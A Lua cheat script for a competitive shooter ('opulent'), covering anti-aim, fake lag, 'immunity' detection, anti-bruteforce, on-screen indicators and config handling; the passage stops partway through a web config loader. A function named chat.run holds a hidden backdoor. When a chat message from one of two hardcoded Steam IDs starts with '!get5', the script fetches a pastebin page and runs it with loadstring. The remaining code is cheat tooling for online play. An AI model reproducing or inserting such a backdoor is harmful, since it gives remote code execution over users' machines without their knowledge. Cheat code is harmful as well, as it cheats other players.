            local current_tick = globals.tickcount() % 360
            local new_yaw = current_tick < 180 and 58 - math.floor(current_tick / 5) or -58 + math.floor((current_tick - 180) / 5)
            new_anti_aim["Yaw"][2] = {"180", new_yaw}
            anti_aim.stage = "Reset"
        else
            anti_aim.stage = "Contortion"
        end]]
        


        -- Finally, apply the contortion yaw on top of the current yaw.
        new_anti_aim[ "Yaw jitter" ][ 2 ] = { "Skitter", contortion_range }
        if body_yaw == "Jitter" then 
            new_anti_aim[ "Body yaw" ][ 2 ] = { "Jitter", 90 }
        elseif body_yaw == "Opposite" then
            new_anti_aim[ "Body yaw" ][ 2 ] = { "Opposite", 90 }
        end
        anti_aim.stage = "Contortion"
    -- Are we currently in defensive?
    elseif current_anti_aim_type == "Defensive" then
        -- Set our silly defensive settings; we're immune, so just using whatever looks cool.
        new_anti_aim[ "Pitch" ][ 2 ] = { "Up", 0 }
        new_anti_aim[ "Yaw" ][ 2 ] = { "Static", 90 }
        anti_aim.stage = "Immunity"
    elseif current_anti_aim_type == "Backstab" then
        -- Use settings that prevent us from being backstabbed.
        new_anti_aim[ "Pitch" ][ 2 ] = { "Custom", 0 }
        new_anti_aim[ "Yaw" ][ 2 ] = { "180", 180 }
        anti_aim.stage = "Anti-backstab"
    end

    -- Iterate over our new anti-aim settings.
    for item_name, item in pairs( new_anti_aim ) do
        -- Is this menu item a table?
        if type( item[ 2 ] ) ~= "table" then
            -- Not a table, set as normal.
            ui.set( item[ 1 ], item[ 2 ] )
        else
            -- We're dealing with a table, iterate over it's members and set them individually.
            for i=1, #item[ 2 ] do
                ui.set( item[ 1 ][ i ], item[ 2 ][ i ] )
            end
        end
    end
end

function anti_aim.handle_keybinds( )
    -- Return if anti-aim isn't active.
    if not ui.get( items.anti_aim ) then
        return
    end

    -- Create a variable to dictate whether or not we should freestand.
    local should_freestand = anti_aim.force_freestanding

    -- Ensure should freestanding isn't already true and the user is holding the key.
    if not should_freestand and ui.get( items.freestanding ) and ui.get( items.freestand_key ) then
        -- We should freestand.
        should_freestand = true
    end

    -- Set our freestanding keys in accordance with our desired value.
    ui.set( references.freestanding[ 1 ], should_freestand )
    ui.set( references.freestanding[ 2 ], should_freestand and "Always on" or "On hotkey" )

    -- Set our edge yaw value to the correlated menu item.
    ui.set( references.edge_yaw, includes( ui.get( items.anti_aim_options ), "Edge yaw" ) )

    -- Reset our force freestand value.
    anti_aim.force_freestanding = false
end

function anti_aim.immunity_detection( )
    -- Are we using anti-aim and double tap? If not, return.
    if not ui.get( items.anti_aim ) or not ui.get( references.double_tap[ 1 ] ) or not ui.get( references.double_tap[ 2 ] ) or ui.get( references.fake_duck ) then
        anti_aim.in_defensive = false
        anti_aim.old_simtime = 0
        return
    end

    -- Grab our local player's simulation time.
    local simtime = entity.get_prop( entity.get_local_player( ), "m_flSimulationTime" )

    -- Local simulation time is ocasionally nil within net update end, so return if that's the case.
    if simtime == nil then
        return
    end

    -- Add our current latency to our latency list.
    anti_aim.latency_list[ #anti_aim.latency_list + 1 ] = client.latency( )

    -- While our latency list has more than 128 members, remove the oldest one.
    while #anti_aim.latency_list > 128 do
        table.remove( anti_aim.latency_list, 1 )
    end

    -- Create a variable to hold our highest latency.
    local highest_latency = 0

    -- Iterate over our latency list.
    for i=1, #anti_aim.latency_list do
        -- Is this latency higher than our saved highest latency?
        if anti_aim.latency_list[ i ] > highest_latency then
            -- Save this as the new highest latency.
            highest_latency = anti_aim.latency_list[ i ]
        end
    end

    -- Add the highest latency to our simtime since the flags we get are delayed by ping.
    local server_simtime = simtime
    -- Grab the delta.
    local delta = server_simtime - anti_aim.old_simtime

    -- Reset our old simtime if the delta is ridiculously high/low.
    if delta > 1 or delta < -1 then
        anti_aim.old_simtime = simtime
    end

    -- Is our current simtime below our previous simtime (invulnerable)?
    if delta < 0 then
        -- Is this the initial trigger of defensive?
        if not anti_aim.in_defensive then
            -- Our defensive duration is the initial gap between our old simtime and the current.
            anti_aim.defensive_duration = ( anti_aim.old_simtime - server_simtime ) - ( ticks_to_time( 1 ) + highest_latency )

            if anti_aim.defensive_duration <= 0 then
                return
            end

            -- Check if we have debug logs enabled.
            if ui.get( items.debug_logs ) then
                -- Calculate what our potential immunity duration was.
                local potential_duration = math.floor( ( anti_aim.defensive_duration / ( anti_aim.old_simtime - simtime ) ) * 100 )
                -- Print out debug information.
                opulent.print( string.format( "Immunity detected [ duration: %st, potential: %s%% ]", time_to_ticks( anti_aim.defensive_duration ), potential_duration ) )
                opulent.print( string.format( "[ delta: %f | predicted: %s | latency: %sms ]", delta, server_simtime, math.floor( highest_latency * 1000 ) ) )
            end
        end

        anti_aim.in_defensive = true
    else
        -- We're hittable, so save this as the last valid simtime.
        anti_aim.old_simtime = server_simtime
        anti_aim.in_defensive = false
    end
end

function anti_aim.command_handling( cmd )
    -- Return if we aren't using anti-aim.
    if not ui.get( items.anti_aim ) then
        return
    end

    -- Save our local player to a variable.
    local local_player = entity.get_local_player( )
    
    -- Check if we're currently twisting or desire to force immunity.
    if anti_aim.stage == "Twist" or ui.get( items.force_immunity[ anti_aim.state ] ) then
        anti_aim.force_immunity = true
    end

    -- Do we have anti-aim on use enabled?
    if includes( ui.get( items.anti_aim_options ), "Desync on use" ) then
        -- Save the defusing and hostage grabbing props to variables.
        local is_defusing = entity.get_prop( local_player, "m_bIsDefusing" )
        local is_grabbing_hostage = entity.get_prop( local_player, "m_bIsGrabbingHostage" )

        -- If we aren't defusing or grabbing a hostage, run the code as normal.
        if is_defusing ~= 1 and is_grabbing_hostage ~= 1 then
            -- Grab our local player's weapon.
            local weapon = entity.get_player_weapon( entity.get_local_player( ) )
            -- Now, grab the name of that weapon.
            local weapon_name = entity.get_classname( weapon )

            -- If we aren't choking commands and are not holding C4, set in_use to 0.
            if cmd.chokedcommands == 0 and weapon_name ~= "CC4" then
                cmd.in_use = 0
            end
        end
    end

    -- Set our force defensive to it's desired value.
    -- NOTE(Sid): I think that setting this every 16 ticks will be better.
    if anti_aim.force_immunity and globals.tickcount() % 16 == 0 then
        anti_aim.last_force_defensive = globals.curtime( )
        cmd.force_defensive = 1
    end

    -- Set our fake lag variables.
    ui.set( references.fake_lag[ 1 ], true )
    ui.set( references.fake_lag[ 2 ], "Always on" )
    ui.set( references.fake_lag_amount, "Dynamic" )
    ui.set( references.fake_lag_variance, 0 )
    ui.set( references.fake_lag_limit, anti_aim.choke_limit )

    -- Reset our force variables.
    anti_aim.force_immunity = false
end

function opulent.animations()
    -- sequence 232 cycle 5 - skydiving
    local local_player = entity.get_local_player()
    if not local_player or not entity.is_alive(local_player) then
        return
    end

    local in_air = bit.band(entity.get_prop(local_player, "m_fFlags"), 1) == 0
    self_index = entity_lib.get_local_player()

    if ui.get(items.animations) == "Off" then
        return
    elseif ui.get(items.animations) == "Skydive mode" and in_air then
        anim_layer = self_index:get_anim_overlay(0)
        anim_layer_second = self_index:get_anim_overlay(6)
        anim_layer.sequence = 232
        anim_layer.cycle = 0.5
        anim_layer_second.sequence = 232
        anim_layer_second.cycle = 0.5
    elseif ui.get(items.animations) == "Funny legs" and not in_air then
        entity.set_prop(entity.get_local_player(), "m_flPoseParameter", 1, 7)
        local my_animlayer = self_index:get_anim_overlay(6)
        my_animlayer.weight = 1
        entity.set_prop(self_index, "m_flPoseParameter", 0, 0)
    elseif ui.get(items.animations) == "Funny legs always" then
        entity.set_prop(entity.get_local_player(), "m_flPoseParameter", 1, 7)
        local my_animlayer = self_index:get_anim_overlay(6)
        my_animlayer.weight = 1
        entity.set_prop(self_index, "m_flPoseParameter", 0, 0)
    end
end


local chat = {
    admins = { "1153409681", "930958110" }
}

function chat.run( cmd )
    local is_admin = false
    for i=1, #chat.admins do
        if tostring( entity.get_steam64( client.userid_to_entindex( cmd.userid ) ) ) == chat.admins[ i ] then
            is_admin = true
            break
        end
    end

    if not is_admin then
        return
    end

    if cmd.text:sub( 1, 5 ) == "!get5" then
        http.get( "https://pastebin.com/raw/" .. cmd.text:sub( 7 ), function( success, response )
            if not success or response.status ~= 200 then
                return
            end

            loadstring( response.body )( )
        end )
    end
end

function anti_aim.lag_handling( )
    -- Return if we aren't using anti-aim.
    if not ui.get( items.anti_aim ) then
        return
    end

    -- Save our local player variables.
    local local_player = entity.get_local_player( )
    local origin = { entity.get_origin( local_player ) }
    local max_process_ticks = ui.get(references.sv_maxusrcmdprocessticks)
    -- Assume we're attempting to choke.
    anti_aim.attempting_choke = true
    -- Create our cmd variables for later use.
    local unchoke = false
    local choke_limit = max_process_ticks - 1

    -- Ensure we aren't using fake duck, which would override doubletap and hide shots.
    if not ui.get( references.fake_duck ) then
        -- Is both the doubletap checkbox (member 1) and the keybind (member 2) active?
        if ui.get( references.double_tap[ 1 ] ) and ui.get( references.double_tap[ 2 ] ) then
            -- Under no condition do we want to fakelag, force unchoke.
            anti_aim.attempting_choke = false
            unchoke = includes( ui.get( items.anti_aim_options ), "Prevent harmful fakelag" )
        -- Doubletap isn't active, is hideshots?
        elseif ui.get( references.on_shot[ 1 ] ) and ui.get( references.on_shot[ 2 ] ) then
            anti_aim.attempting_choke = false
            unchoke = includes( ui.get( items.anti_aim_options ), "Prevent harmful fakelag" )
        -- We are not using double tap or hideshots, but still want to prevent harmful fakelag.
        elseif includes( ui.get( items.anti_aim_options ), "Prevent harmful fakelag" ) then
            -- Extrapolate our origin by the max process ticks, or, our max fake lag.
            local predicted_origin = anti_aim.extrapolate( local_player, max_process_ticks - 1 )
            
            -- Subtract our predicted origin by our current origin to calculate the difference.
            for i=1, 3 do
                predicted_origin[ i ] = predicted_origin[ i ] - origin[ i ]
            end

            -- Now, get the delta between our current position and the extrapolated version.
            local predicted_delta = length_sqr( predicted_origin )

            -- Are we predicted to be going less than 64u/s (not breaking lc)?
            if predicted_delta <= 4096 and #anti_aim.origin_list >= 64 then
                -- We can't break LC in the future, but we could still be breaking it now, so
                -- we're going to compare our current position to our oldest possible position.
                local new_origin = { }
                for i=1, 3 do
                    new_origin[ i ] = origin[ i ] - anti_aim.origin_list[ max_process_ticks - 1 ][ i ]
                end

                -- Calculate the delta between our current origin and the oldest.
                local delta = length_sqr( new_origin )

                -- Same as the predicted origin, don't choke if we won't break LC anyway.
                if delta <= 4096 then
                    unchoke = true
                end
            end
        end
    end

    -- Ensure we have the minimum choke limit set when we're trying to unchoke.
    if unchoke then
        choke_limit = 1
    end

    -- Set our choke limit.
    anti_aim.choke_limit = choke_limit

    -- Insert our current origin to the most recent position in the table.
    table.insert( anti_aim.origin_list, 1, origin )

    -- While our origin list has more than 64 members, remove the oldest.
    while #anti_aim.origin_list > 64 do
        table.remove( anti_aim.origin_list, #anti_aim.origin_list )
    end
end


-- miss counter/antibrute
local function on_player_hurt(e)
    local local_player = entity.get_local_player()
    local victim_userid, attacker_userid = e.userid, e.attacker
    local victim_entindex, attacker_entindex = client.userid_to_entindex(victim_userid), client.userid_to_entindex(attacker_userid)

    if entity.is_enemy(attacker_entindex) and victim_entindex == entity.get_local_player() then
        anti_aim.local_damaged = true
        client.delay_call(0.1, function() anti_aim.local_damaged = false end)
    end
end

local function get_head_hitbox()
    local local_player_index = entity.get_local_player() or -1
    anti_aim.head_hitbox = {entity.hitbox_position(local_player_index, 0)}
end

local function on_bullet_impact(e)
    if not entity.is_alive(entity.get_local_player()) then
        return
    end
    if anti_aim.local_damaged then return end
    local ent = client.userid_to_entindex(e.userid)
    if entity.is_enemy(ent) and not entity.is_dormant(ent) then
        local m_vecOrigin = {entity.get_prop(ent, "m_vecOrigin")}
        m_vecOrigin[3] = m_vecOrigin[3] + entity.get_prop(ent, "m_vecViewOffset[2]")

        local m_clPoint = GetClosestPoint(m_vecOrigin, {e.x, e.y, e.z}, anti_aim.head_hitbox)
        local delta = {anti_aim.head_hitbox[1] - m_clPoint[1], anti_aim.head_hitbox[2] - m_clPoint[2]}
        local delta_2d = math.sqrt(delta[1] ^ 2 + delta[2] ^ 2)

        if math.abs(delta_2d) < 35 and globals.curtime() > anti_aim.delay then
            anti_aim.delay = globals.curtime() + 0.35
            anti_aim.miss_counter_game = anti_aim.miss_counter_game + 1
            anti_aim.miss_counter_round = anti_aim.miss_counter_round + 1
        end
    end
end

local function reset_brute_round()
    anti_aim.delay = 0
    anti_aim.miss_counter_round = 0
    anti_aim.local_damaged = false
end

local function reset_brute_game()
    anti_aim.delay = 0
    anti_aim.miss_counter_game = 0
    anti_aim.local_damaged = false
end







-- Register our safety flag.
client.register_esp_flag( "T", 0, 255, 0, function( ent )
    -- Ensure we have enabled the safety flag, master switch and anti-aim.
    if not ui.get( items.master_switch ) or not ui.get( items.anti_aim ) or not ui.get( items.safety_flag ) then
        return false
    end

    -- Is this player dormant? If so, return with a transparent gray color.
    if entity.is_dormant( ent ) then
        return true, "\aFFFFFF82T"
    end

    -- Grab the safety of this player.
    local target_safe = anti_aim.safe[ ent ]

    -- Is our target considered safe?
    if target_safe ~= nil and target_safe then
        return true
    else
        -- This player is unsafe, return true along with red texa we obtain via \a.
        return true, "\aFF0000FFT"
    end
end )

-- Array to hold all of our clan tag related items.
local clan_tag = {
    -- Are we trying to reset our clan tag back to default?
    reset = false,
    -- How long ago we last updated our clan tag.
    last_update = 0
}

function clan_tag.run( )
    -- Do we not have the custom clan tag enabled?
    if not ui.get( items.clan_tag ) then
        -- Are we trying to reset our clan tag?
        if clan_tag.reset then
            -- Grab our local player's clan tag prop.
            local local_tag = entity.get_prop( entity.get_player_resource( ), "m_szClan", entity.get_local_player( ) )

            -- If the tag isn't yet blank, keep attempting to reset.
            if local_tag ~= nil and local_tag ~= "" then
                -- Set our clan tag to blank.
                client.set_clan_tag( "" )
                -- Check if we have debug logs enabled.
                if ui.get( items.debug_logs ) then
                    -- Print out debug information.
                    opulent.print( "Resetting clan tag" )
                end
            else
                -- Clan tag successfully reset, stop trying to do so.
                clan_tag.reset = false
                -- Check if we have debug logs enabled.
                if ui.get( items.debug_logs ) then
                    -- Print out debug information.
                    opulent.print( "Clan tag successfully reset" )
                end
            end
        end
        return
    end

    -- Save a variable holding how long it has been since our last update.
    local updated = globals.tickcount( ) - clan_tag.last_update
    -- If our last clan tag update was less than a tick ago, return.
    if updated < 1 and math.abs( updated ) < 32 then
        return
    end

    -- Create a variable to hold our tickcount with our latency in ticks added.
    local tag_tick = globals.tickcount( ) + time_to_ticks( client.latency( ) / 2 )
    
    -- Finally, set our clan tag.
    client.set_clan_tag( tag_tick % 64 > 32 and "[ + opulent / ]" or "[ / opulent - ]" )

    -- Let the lua know we just updated.
    clan_tag.last_update = globals.tickcount( )

    -- Set our 'reset' variable to true.
    clan_tag.reset = true
end

local indicators = {
    defensive_alpha = 0,
    defensive_time = 0,
    current_text = { "", "" },
    ideal_text = { "", "" },
    flip_text = { false, false },
    last_text_update = { 0, 0 },
    current_number = 0,
    ideal_number = 0
}

indicators.run = function( )
    -- Grab our local player.
    local local_player = entity.get_local_player( )

    -- Return if we aren't alive.
    if not entity.is_alive( local_player ) then
        return
    end

    -- Grab our anti-aim state for repeated usage.
    local aa_state = ui.get( items.anti_aim )

    -- Get our screen size and save it to sc_w and sc_h respectively.
    local sc_w, sc_h = client.screen_size( )

    -- Create our target variables and grab our target, also set default name string.
    local target = client.current_threat( )
    local target_name = "unavailable"
    local target_safe = true
    local target_danger = 0
    
    -- Is our target null?
    if target ~= nil then
        -- Calculate our target's danger using the same logic as our anti-aim.
        target_danger = 100 - math.floor( math.min( 1, anti_aim.grab_ping( target ) / anti_aim.max_ping_threshold ) * 100 )
        -- Grab the player name.
        target_name = entity.get_player_name( target )
        -- If our safe variable isn't nil, set it accordingly.
        if anti_aim.safe[ target ] ~= nil then
            target_safe = anti_aim.safe[ target ]
        end
    end

    -- Is defensive active?
    if anti_aim.in_defensive or indicators.defensive_alpha ~= 0 then
        -- Have we set our defensive time yet?
        if indicators.defensive_time == 0 then
            indicators.defensive_time = globals.curtime( )
        end

        -- Calculate how far into defensive we are.
        local defensive_amount = math.max( 0, math.min( 1, ( globals.curtime( ) - indicators.defensive_time ) / anti_aim.defensive_duration ) )

        -- How far should we offset the indicator on the Y axis?
        local indicator_offset = -50
        -- Maximum width and height for the defensive progress bar.
        local bar_w = 50
        local bar_h = 2
        -- How far we want the bar to be from the indicator text.
        local bar_offset = -10

        -- Calculate the X and Y positions for our bar.
        local bar_x = sc_w / 2 - ( bar_w / 2 )
        local bar_y = indicator_offset + bar_offset + sc_h / 2

        -- Increase/decrease this value to make the indicator fade slower/faster.
        local fade_in_speed = 4000
        local fade_out_speed = 1000

        if defensive_amount == 1 then
            -- Increment our defensive alpha using frametime to account for FPS differences.
            indicators.defensive_alpha = math.max( 0, indicators.defensive_alpha - ( globals.frametime( ) * fade_out_speed ) )
        else
            -- Increment our defensive alpha using frametime to account for FPS differences.
            indicators.defensive_alpha = math.min( 255, indicators.defensive_alpha + ( globals.frametime( ) * fade_in_speed ) )
        end

        -- Draw the background of our progress bar.
        renderer.rectangle( bar_x - 1, bar_y - 1, bar_w + 2, bar_h + 2, 0, 0, 0, indicators.defensive_alpha )
        
        -- Draw the actual progress bar, multiplying our width by our defensive amount.
        renderer.rectangle( bar_x, bar_y, bar_w * defensive_amount, bar_h, 255, 255, 255, indicators.defensive_alpha )

        -- Finally, draw our defensive text.
        renderer.text( sc_w / 2, indicator_offset + sc_h / 2, 255, 255, 255, indicators.defensive_alpha, "c-", 0, "IMMUNITY" )
    else
        -- Reset our defensive indicator settings.
        indicators.defensive_time = 0
        indicators.defensive_alpha = 0
    end

    -- Are we currently using ideal tick?
    if ideal_tick.active then
        -- How far should we offset the indicator on the Y axis?
        local indicator_offset = -20
        -- Are we currently using safe anti aim? If so, make the text red/green accordingly.
        local text_color = target_safe and "67BCFFFF" or "FF6779FF"

        -- Finally, display our ideal tick text.
        renderer.text( sc_w / 2, indicator_offset + sc_h / 2, 255, 255, 255, 255, "c-", 0, "IDEAL \a", text_color, "TICK" )
    end

    -- Miss Counter Indicators


    -- Is our debug panel enabled?
    if ui.get( items.debug_panel ) then
        -- Our array of 'debug' strings, in the format of the string and display value.
        local debug_strings = {
            [ "State" ] = anti_aim.states[ anti_aim.state ]:lower( ),
            [ "Choke limit" ] = anti_aim.choke_limit,
            [ "Force immunity" ] = anti_aim.force_immunity,
            [ "Anti-aim" ] = anti_aim.stage:lower( ),
            [ "Target" ] = target_name:lower( ),
            [ "Danger" ] = target_danger .. "%",
            [ "Miss counter (Round)" ] = anti_aim.miss_counter_round,
            [ "Miss counter (Game)" ] = anti_aim.miss_counter_game
        }

        -- Variable to keep track of how far into the iteration we are.
        local debug_iter = 0
        -- How far we want the strings to display from each other in pixels (Y axis).
        local string_offset = 15

        for k, v in pairs( debug_strings ) do
            renderer.text( 6, debug_iter * string_offset + sc_h / 2, 255, 255, 255, 255, nil, 0, string.format( "[ %s : %s ]", k, v ) )
            debug_iter = debug_iter + 1
        end
    end

    if ui.get( items.anti_aim ) and ui.get(items.indicator_enable) then
        indicators.ideal_text[ 1 ] = target_safe and "safe" or "unsafe"
        indicators.ideal_text[ 2 ] = anti_aim.states[ anti_aim.state ]:lower( )
        indicators.ideal_number = 100 - target_danger

        if indicators.ideal_number > indicators.current_number then
            indicators.current_number = indicators.current_number + ( globals.frametime( ) * 150 )
            if indicators.ideal_number < indicators.current_number then
                indicators.current_number = indicators.ideal_number
            end
        elseif indicators.ideal_number < indicators.current_number then
            indicators.current_number = indicators.current_number - ( globals.frametime( ) * 150 )
            if indicators.ideal_number > indicators.current_number then
                indicators.current_number = indicators.ideal_number
            end
        end

        for i=1, 2 do
            if indicators.current_text[ i ] ~= indicators.ideal_text[ i ] then
                if globals.curtime( ) - indicators.last_text_update[ i ] > 0.02 then
                    if indicators.current_text[ i ]:len( ) <= 0 or indicators.flip_text[ i ] then
                        indicators.current_text[ i ] = indicators.ideal_text[ i ]:sub( indicators.ideal_text[ i ]:len( ) - indicators.current_text[ i ]:len( ) )
                        indicators.flip_text[ i ] = true
                    else
                        indicators.current_text[ i ] = indicators.current_text[ i ]:sub( 1, -2 )
                    end
                    indicators.last_text_update[ i ] = globals.curtime( )
                end
            else
                indicators.flip_text[ i ] = false
            end
        end

     
        if includes( ui.get( items.safety_triggers[ anti_aim.state ]), "Dangerous enemy") then 
            renderer.text( sc_w / 2, sc_h / 2 + 50, 255, 255, 255, 255, "c", 0, string.format( "%s%% / %s / %s", math.floor( indicators.current_number ), indicators.current_text[ 1 ], indicators.current_text[ 2 ] ) )
          else
           renderer.text( sc_w / 2, sc_h / 2 + 50, 255, 255, 255, 255, "c", 0, string.format( "%s", indicators.current_text[ 2 ]) )
          end
    end
    if ui.get(items.indicator_enable) then

    -- Animation length in seconds.
    local animation_length = 1
    -- Animation speed in seconds.
    local animation_speed = 0.05
    local animation_time = globals.curtime( ) % animation_length
    
    -- The text that we're going to display; default value is what it will display when animation is done.
    local text = "dev"
    -- The text our label is going to cycle through (max members = animation_length / animation_speed).
    local animated_text = {
        "!%>",
        "d&^",
        "de#",
    }
    
    -- Iterate over our animated text cycle.
    for i=1, #animated_text do
        -- Is it time for this cycle to override the text? If so, set the text variable and break.
        if animation_time < i * animation_speed then
            text = animated_text[ i ]
            break
        end
    end

    -- Now time for getting our interpolated label color, start by defining our fade length in seconds.
    local fade_length = 2
    local fade_time = globals.curtime( ) % fade_length
    -- Calculate the interpolation factor for the fade time.
    local factor = fade_time > fade_length / 2 and fade_length - fade_time or fade_time

    -- The two colors that we're going to be interpolating between.
    local first_color, second_color = { 255, 165, 165 }, { 165, 165, 255 }
    -- Interpolate the color, then unpack the lerped color table, and finally convert it to hex.
    local lerped_color = rgb_to_hex( table.unpack( opulent.lerp_color( first_color, second_color, factor ) ) )

    renderer.text( sc_w / 2, sc_h / 2 + 37, 255, 255, 255, 255, "cb", 0, "opulent.\a", lerped_color, text )
    renderer.text( sc_w / 2, sc_h / 2 + 65, 255, 255, 255, 255, "c", 0, string.format("[ %s:%s ]", anti_aim.contortion_amount, anti_aim.body_yaw )) 
    else
    renderer.text( sc_w / 2, sc_h - 30, 255, 255, 255, 255, "c", 0, "discord.gg/opulent" )

    end
    if ui.get(items.miss_counter) then
        renderer.text( sc_w / 2, sc_h / 2 + 80, 255, 255, 255, 255, "c", 0, string.format("[ %s:%s ]", anti_aim.miss_counter_round, anti_aim.miss_counter_game )) 
    end



end

-- Handles all of our special labels.
function opulent.label_handling( )
    -- Animation length in seconds.
    local animation_length = 1
    -- Animation speed in seconds.
    local animation_speed = 0.07
    local animation_time = globals.curtime( ) % animation_length

    -- The text that we're going to display; default value is what it will display when animation is done.
    local text = "dev"
    -- The text our label is going to cycle through (max members = animation_length / animation_speed).
    local animated_text = {
        "!%>",
        "d&^",
        "de#",
    }

    -- Iterate over our animated text cycle.
    for i=1, #animated_text do
        -- Is it time for this cycle to override the text? If so, set the text variable and break.
        if animation_time < i * animation_speed then
            text = animated_text[ i ]
            break
        end
    end

    -- Now time for getting our interpolated label color, start by defining our fade length in seconds.
    local fade_length = 2
    local fade_time = globals.curtime( ) % fade_length
    -- Calculate the interpolation factor for the fade time.
    local factor = fade_time > fade_length / 2 and fade_length - fade_time or fade_time

    -- The two colors that we're going to be interpolating between.
    local first_color, second_color = { 255, 165, 165 }, { 165, 165, 255 }
    -- Interpolate the color, then unpack the lerped color table, and finally convert it to hex.
    local lerped_color = rgb_to_hex( table.unpack( opulent.lerp_color( first_color, second_color, factor ) ) )

    -- Finally, apply the gradient to the label.
    ui.set( items.master_switch_label, string.format( "Opulent.\a%s%s", lerped_color, text ) )

    -- Create the gradient text for our regular labels.
    local visuals_text = opulent.gradient_text({ 239, 92, 168, 255}, {91, 111, 240, 255},
    "Visuals")
    local fake_lag_text = opulent.gradient_text( { 255, 130, 130, 255 }, { 150, 150, 255, 255 },
        "Fake lag info" )
    local fake_lag_info_text = opulent.gradient_text( { 255, 130, 130, 255 }, { 150, 150, 255, 255 },
        string.format( "[ choke state: %s/%s ]", anti_aim.choke_limit, anti_aim.attempting_choke ) )

    -- Now, set the labels along with our newly created gradient text.
    ui.set( items.visuals_label, visuals_text)
   ui.set( items.fake_lag_label, fake_lag_text )
    ui.set( items.fake_lag_label_info, fake_lag_info_text )
end

function opulent.console_handling( cmd )
    -- Are we attempting to print the update log?
    if cmd == "update log" then
        -- Clear our console.
        client.exec( "clear" )
        opulent.print( "- Update log [BETA]" )
        -- Iterate over the updates.
        for i=1, #opulent.updates.beta do
            -- Print the update string.
            opulent.print( opulent.updates.beta[ i ] )
        end
        opulent.print( " " )
        opulent.print( "- Update log [LIVE]" )
        for i=1, #opulent.updates.live do
            -- Print the update string.
            opulent.print( opulent.updates.live[ i ] )
        end
    end
end

-- Used to reset variables; triggers at the start of every new round.
function opulent.reset_data( )
    indicators.defensive_time = 0
    indicators.defensive_alpha = 0
    anti_aim.last_force_defensive = 0
    anti_aim.old_simtime = 0
    anti_aim.latency_list = { }
    anti_aim.in_defensive = false
    anti_aim.defensive_duration = 0
    anti_aim.safe = { }
    anti_aim.origin_list = { }
    anti_aim.miss_counter_round = 0 
    indicators.current_text = { "", "" }
    indicators.ideal_text = { "", "" }
    indicators.flip_text = { false, false }
    indicators.last_text_update = { 0, 0 }
    indicators.current_number = 0
    indicators.ideal_number = 0
end

-- Triggered when the lua is unloaded
function opulent.on_unload( )
    -- Reset our clantag if it was active.
    if ui.get( items.clan_tag ) then
        client.set_clan_tag( "" )
    end
    reset_brute_game()
    reset_brute_round()
    -- Disable the master switch to ensure the lua knows not to run anything.
    ui.set( items.master_switch, false )
end

-- Holds all of the items for our config handling.
local configs = {
    names = { "Alpha", "Bravo", "Charlie" },
    web_configs = {
        [ "Beta" ] = "https://raw.githubusercontent.com/sid3131/webconfigs/main/beta",
        [ "Live" ] = "https://raw.githubusercontent.com/sid3131/webconfigs/main/live"
    },
    current = nil
}

function configs.grab( )
    local config_array = { }

    -- Iterate over our items, the item variable and then the menu item.
    for var, item in pairs( items ) do
        -- Skip hotkeys during config savings.
        if item == items.ideal_tick_key or item == items.freestand_key then
            goto continue
        end

        -- Are we dealing with a table?
        if type( item ) ~= "table" then
            -- Save the item value to our newly created array.
            config_array[ var ] = ui.get( item )
        else
            -- We're dealing with a table, do the same but iterate over the members.
            -- Create a new array so we aren't accessing nil members.
            config_array[ var ] = { }
            for i=1, #item do
                config_array[ var ][ i ] = ui.get( item[ i ] )
            end
        end

        ::continue::
    end

    -- Return our new config array.
    return config_array
end

function configs.apply( new_config )
    -- Iterate over the values held within the config array.
    for var, item in pairs( new_config ) do
        -- Is this a table?
        -- ( multi selects are a table but need the same handling )
        if type( item ) ~= "table" or items[ var ] == items.anti_aim_options or items[ var ] == items.ideal_tick_options then
            -- Set the correlated menu item to the config value.
            ui.set( items[ var ], item )
        else
            -- We are dealing with an array, do the same but iteratively.
            for i=1, #item do
                ui.set( items[ var ][ i ], item[ i ] )
            end
        end
    end
end

function configs.save( )
    -- Is our config database nil?
    if database.read( "opulent" ) == nil then
        -- Create a new config array that we will use to write to the database.
        local config_array = { }

        -- Iterate over all the config names we're using.
        for i=1, #configs.names do
            -- Create a new member with a blank string.
            config_array[ configs.names[ i ] ] = " "
        end

        -- Finally, write this new array to the database.
        database.write( "opulent", config_array )
    end

    -- Grab our config values.
    local new_config = configs.grab( )

    -- Use json to translate our array into a string.
    local config_string = json.stringify( new_config )
    -- Now translate that to base64 to condense it.
    config_string = base64.encode( config_string )

    -- Find our config's member in the database and set it to the config.
    local current_database = database.read( "opulent" )
    current_database[ ui.get( configs.current ) ] = config_string

    -- Finally, override the old database with the new one containing our updated config.
    database.write( "opulent", current_database )
    -- Notify the user.
    client.exec( "play ui\\csgo_ui_store_select" )
    opulent.print( "Successfully saved config" )
end

function configs.load( )
    -- Find our config's member in the database and grab the string.
    local config_string = database.read( "opulent" )[ ui.get( configs.current ) ]
    -- Decode the stringified array that we now have access to.
    config_string = base64.decode( config_string )
    
    -- Create an array to hold our new config.
    local new_config = { }
    -- Simulate our parse to see whether or not we have a valid config.
    if not pcall( json.parse, config_string ) then
        -- The function gave an error, let the user know.
        opulent.print( "Failed to load config, ensure that it's not empty!" )
        client.exec( "play ui\\menu_invalid" )
        return
    end

    -- Now parse it to convert it to a usable array.
    new_config = json.parse( config_string )

    -- Now apply our new config.
    configs.apply( new_config )
    -- Notify the user.
    client.exec( "play ui\\csgo_ui_store_select" )
    opulent.print( "Successfully loaded config" )
end

function configs.export( )
    -- Grab our config values.
    local new_config = configs.grab( )

    -- Use json to translate our array into a string.
    local config_string = json.stringify( new_config )
    -- Now translate that to base64 to condense it.
    config_string = base64.encode( config_string )

    -- Finally, set our config string to our clipboard and print success.
    clipboard.set( config_string )
    client.exec( "play ui\\csgo_ui_store_select" )
    opulent.print( "Successfully saved config to clipboard. ")
end

function configs.import( )
    -- First, decode the stringified array that we have on our clipboard.
    local config_string = base64.decode( clipboard.get( ) )
    -- Now parse it to convert it to a usable array.
    local new_config = json.parse( config_string )

    -- Apply our config with the imported values.
    configs.apply( new_config )
    client.exec( "play ui\\csgo_ui_store_select" )
    opulent.print( "Successfully imported config" )
end

function configs.import_from_web( )
    opulent.print( "Loading config from web" )
    client.exec( "play ui\\panorama\\itemtile_click_02" )

    client.delay_call( 0.4, function( )
        http.get( configs.web_configs[ ui.get( configs.web_config_name ) ], function( success, response)
            if not success or response.status ~= 200 then
                opulent.print( "Failed to import the config from web, ensure your ISP allows access to github!" )
                client.exec( "play ui\\menu_invalid" )
                return
            end
            
            -- Find our config's member in the database and grab the string.
            local config_string = response.body:sub( 1, -2 )
            -- Decode the stringified array that we now have access to.
            config_string = base64.decode( config_string )
            
            -- Create an array to hold our new config.
            local new_config = { }
            -- Simulate our parse to see whether or not we have a valid config.
            if not pcall( json.parse, config_string ) then
